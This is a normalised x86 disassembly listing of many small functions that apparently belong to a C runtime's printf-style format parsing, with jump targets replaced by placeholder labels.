mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c4df
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4df
add esp 0x10
sub_42264e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426bff
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_42678d
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_4242da
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4234c6
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425b63
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4263c0
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424d4e
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_426658
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428b8e
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c53c
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428843
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c53c
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c53c
add esp 0x10
sub_4228ab
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426c73
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4267a5
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f423
test al al
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_42444c
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423529
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
cmp [ esi + 0x30 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425c9d
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_426434
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424de6
jmp r-xdata
cmp eax 0x44
jle r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
mov ecx esi
call sub_426677
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
cmp eax 0x53
jne r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428b8e
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c53c
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4288ce
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c53c
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c53c
add esp 0x10
sub_422b17
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426cf1
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4267bd
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_4245dd
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4235a8
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425e03
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4264cd
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424e95
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_426696
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428b8e
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c53c
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428959
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c53c
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c53c
add esp 0x10
sub_422d74
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41df1e
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422d9f
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_427125
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41df7a
pop esi
retn
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422ddf
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41dfd6
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422e0a
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e032
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422e35
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_4271db
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e08e
pop esi
retn
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422e75
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e0ea
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422ea0
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e146
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422ecc
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_427291
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e1a4
pop esi
retn
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422f0d
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e202
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422f39
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e260
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422f65
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_427348
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e2be
pop esi
retn
mov ecx esi
call sub_41f310
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422fa6
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e31c
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_423023
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xb
ja r-xdata
xor eax eax
pop ebp
retn
jmp [ eax * 4 + jump_table_42304f ]
push 0x4
xor eax eax
inc eax
pop ebp
retn
push 0x2
jmp r-xdata
push 0x8
jmp r-xdata
pop eax
pop ebp
retn
sub_4230f7
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42315a
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a2c3
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_4231d9
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42323c
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42329f
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a38f
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_42331e
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b4f1
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_423381
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_4233e4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a45b
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_423463
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_4234c6
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_423529
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a527
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f310
test al al
je r-xdata
mov al 0x1
push ebx
push edi
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop ebx
sub_4235a8
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b531
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_42360b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
